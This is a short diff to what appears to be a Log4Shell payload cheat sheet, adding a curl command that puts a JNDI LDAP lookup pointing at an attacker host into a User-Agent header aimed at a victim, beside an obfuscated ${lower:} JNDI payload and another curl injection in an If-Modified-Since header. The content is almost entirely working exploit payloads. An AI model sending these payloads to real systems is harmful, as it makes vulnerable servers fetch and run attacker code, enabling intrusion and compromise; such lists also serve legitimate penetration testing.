@@ -57,6 +57,7 @@ ${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}
 Curl
 ```
 curl -vv -H "If-Modified-Since: \${jndi:ldap://localhost:80/abc}"
+curl -H 'User-Agent: ${jndi:ldap://<ip-attacker>:<port>/a}' <ip-victim>:<port>
 ```
 
 Log4j-Keywords 
